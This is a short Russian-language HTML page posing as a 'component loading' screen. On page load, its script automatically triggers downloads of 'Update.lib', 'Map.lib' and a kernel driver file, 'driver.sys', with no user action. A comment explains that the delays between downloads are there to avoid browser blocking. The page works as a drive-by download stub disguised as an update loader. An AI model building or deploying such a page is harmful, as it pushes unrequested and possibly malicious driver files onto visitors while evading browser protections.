<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка компонентов</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 20px;
            border: 1px solid #333;
            border-radius: 8px;
            background-color: #1e1e1e;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        .status {
            font-size: 1.2rem;
            margin-bottom: 15px;
        }
        .loader {
            border: 4px solid #333;
            border-top: 4px solid #00ff88;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="status" id="status-text">Подготовка к загрузке...</div>
    <div class="loader" id="loader"></div>
</div>

<script>
    // Список файлов для скачивания
    const files = [
        'Update.lib',
        'Map.lib',
        'driver.sys'
    ];

    // Функция для триггера скачивания
    function downloadFile(file) {
        const link = document.createElement('a');
        link.href = file;
        link.download = file;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }

    // Запуск скачивания с небольшой задержкой между файлами
    window.addEventListener('DOMContentLoaded', () => {
        const statusText = document.getElementById('status-text');
        const loader = document.getElementById('loader');
        
        statusText.innerText = "Скачивание файлов...";

        files.forEach((file, index) => {
            setTimeout(() => {
                downloadFile(file);
                
                // Если это последний файл, обновляем статус
                if (index === files.length - 1) {
                    statusText.innerText = "Загрузка завершена.";
                    loader.style.display = 'none';
                }
            }, index * 800); // Задержка 800мс между файлами во избежание жесткой блокировки браузером
        });
    });
</script>

</body>
</html>
